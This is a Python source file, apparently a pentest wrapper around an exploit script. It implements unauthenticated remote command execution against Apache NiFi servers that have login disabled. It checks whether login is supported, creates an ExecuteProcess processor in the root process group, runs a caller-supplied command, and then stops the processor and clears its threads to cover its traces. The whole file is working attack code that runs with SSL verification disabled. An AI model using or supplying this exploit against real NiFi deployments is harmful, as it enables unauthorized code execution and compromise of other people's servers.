import json
import requests as req
from typing import Optional, Dict, Any


class NiFiClient:
    """
    NiFi 客户端 - 基于 exp.py 的渗透测试功能封装
    用于利用 NiFi 漏洞进行安全测试
    """

    def __init__(self, url: str):
        """
        初始化 NiFi 客户端

        Args:
            url: NiFi 服务器 URL
        """
        self.url = url.rstrip('/')
        self.session = req.Session()
        # 禁用 SSL 验证警告
        req.packages.urllib3.disable_warnings()

    def check_is_vul(self) -> bool:
        """
        检查目标 NiFi 服务器是否漏洞

        Returns:
            bool: 如果存在漏洞返回 True，否则返回 False
        """
        url = f"{self.url}/nifi-api/access/config"
        try:
            res = self.session.get(url=url, verify=False, timeout=10)
            if res.status_code == 200:
                data = res.json()
                return not data["config"]["supportsLogin"]
        except Exception as e:
            pass
        return False

    def clean_up(self, p_id: str) -> bool:
        """
        清理恶意处理器

        Args:
            p_id: 处理器 ID

        Returns:
            bool: 清理成功返回 True
        """
        try:
            url = f"{self.url}/nifi-api/processors/{p_id}"
            # 停止处理器
            data = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}
            self.session.put(url=f"{url}/run-status", data=json.dumps(data), verify=False, timeout=10)

            # 删除处理器线程
            self.session.delete(f"{url}/threads", verify=False, timeout=10)
            return True
        except Exception as e:
            return False

    def exploit(self, cmd: str) -> Dict[str, Any]:
        """
        利用 NiFi 漏洞执行命令

        Args:
            cmd: 要执行的命令

        Returns:
            Dict[str, Any]: 执行结果
        """
        result = {
            "success": False,
            "message": "",
            "processor_id": None,
            "response": None
        }

        try:
            # 获取根进程组 ID
            g_id = self._fetch_process_group()
            if not g_id:
                result["message"] = "Failed to fetch process group ID"
                return result

            # 创建恶意处理器
            p_id = self._create_process(g_id)
            if not p_id:
                result["message"] = "Failed to create malicious processor"
                return result

            # 执行命令
            response = self._run_cmd(p_id, cmd)

            # 清理处理器
            self.clean_up(p_id)

            result.update({
                "success": True,
                "message": "Command executed successfully",
                "processor_id": p_id,
                "response": response
            })

        except Exception as e:
            result["message"] = f"Exploitation failed: {str(e)}"

        return result

    def _run_cmd(self, p_id: str, cmd: str) -> Optional[Dict[str, Any]]:
        """
        在指定处理器中运行命令

        Args:
            p_id: 处理器 ID
            cmd: 要执行的命令

        Returns:
            Optional[Dict[str, Any]]: 执行响应
        """
        try:
            url = f"{self.url}/nifi-api/processors/{p_id}"
            cmd_parts = cmd.split(" ")

            data = {
                'component': {
                    'config': {
                        'autoTerminatedRelationships': ['success'],
                        'properties': {
                            'Command': cmd_parts[0],
                            'Command Arguments': " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else "",
                        },
                        'schedulingPeriod': '3600 sec'
                    },
                    'id': p_id,
                    'state': 'RUNNING'
                },
                'revision': {'clientId': 'x', 'version': 1}
            }

            headers = {
                "Content-Type": "application/json",
            }

            res = self.session.put(url=url, data=json.dumps(data), headers=headers, verify=False, timeout=10)
            if res.status_code == 200:
                return res.json()
            return None

        except Exception as e:
            return None

    def _fetch_process_group(self) -> Optional[str]:
        """
        获取根进程组 ID

        Returns:
            Optional[str]: 进程组 ID
        """
        try:
            url = f"{self.url}/nifi-api/process-groups/root"
            res = self.session.get(url=url, verify=False, timeout=10)
            if res.status_code == 200:
                return res.json()["id"]
        except Exception as e:
            pass
        return None

    def _create_process(self, process_group_id: str) -> Optional[str]:
        """
        在指定进程组中创建恶意处理器

        Args:
            process_group_id: 进程组 ID

        Returns:
            Optional[str]: 新创建的处理器 ID
        """
        try:
            url = f"{self.url}/nifi-api/process-groups/{process_group_id}/processors"
            data = {
                'component': {
                    'type': 'org.apache.nifi.processors.standard.ExecuteProcess'
                },
                'revision': {
                    'version': 0
                }
            }
            headers = {
                "Content-Type": "application/json",
            }

            res = self.session.post(url=url, data=json.dumps(data), headers=headers, verify=False, timeout=10)
            if res.status_code == 201:
                return res.json()["id"]
        except Exception as e:
            pass
        return None